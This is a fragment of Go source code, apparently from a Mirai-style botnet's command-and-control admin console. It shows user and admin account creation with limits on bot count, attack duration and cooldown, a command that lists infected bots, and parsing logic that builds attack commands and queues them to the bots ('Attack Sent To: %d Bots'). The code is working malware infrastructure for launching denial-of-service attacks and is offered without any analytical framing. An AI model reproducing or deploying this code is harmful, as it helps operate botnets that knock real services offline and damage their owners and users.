			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;33mUser Added Successfully!\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "REMOVEUSER" {
			this.conn.Write([]byte("\x1b[1;33mUsername: \x1b[0m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \x1b[1;33mAre You Sure You Want To Remove \x1b[1;93m" + rm_un + "\x1b[1;33m?(y/n): \x1b[0m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to Remove User\r\n")))
			} else {
				this.conn.Write([]byte("\x1b[1;33mUser Successfully Removed!\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "ADDADMIN" {
			this.conn.Write([]byte("\x1b[1;33mUsername:\x1b[0m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;33mPassword:\x1b[0m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\x1b[1;33mBotcount (-1 for All):\x1b[0m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;33mAttack Duration (-1 for Unlimited):\x1b[0m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;33mCooldown (0 for No Cooldown):\x1b[0m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Cooldown")))
				continue
			}
			this.conn.Write([]byte("\x1b[1;93m- New User Info - \r\n- Username - \x1b[1;93m" + new_un + "\r\n\033[0m- Password - \x1b[1;93m" + new_pw + "\r\n\033[0m- Bots - \x1b[1;93m" + max_bots_str + "\r\n\033[0m- Max Duration - \x1b[1;93m" + duration_str + "\r\n\033[0m- Cooldown - \x1b[1;93m" + cooldown_str + "   \r\n\x1b[1;33mContinue? (y/n):\x1b[0m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\x1b[1;33mAdmin Added Successfully!\033[0m\r\n"))
			}
			continue
		}

		if cmd == "BOTS" || cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;93m%s \x1b[0m[\x1b[1;93m%d\x1b[0m]\r\n\033[0m", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;93mTotal \x1b[0m[\x1b[1;93m%d\x1b[0m]\r\n\033[0m", botCount)))
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[34;1mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[34;1mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					var BotCount int
					BotCount = clientList.Count()
					this.conn.Write([]byte(fmt.Sprintf("\033[90mAttack Sent To: %d \x1b[1;33mBots  \r\n", BotCount)))
				} else {
					fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
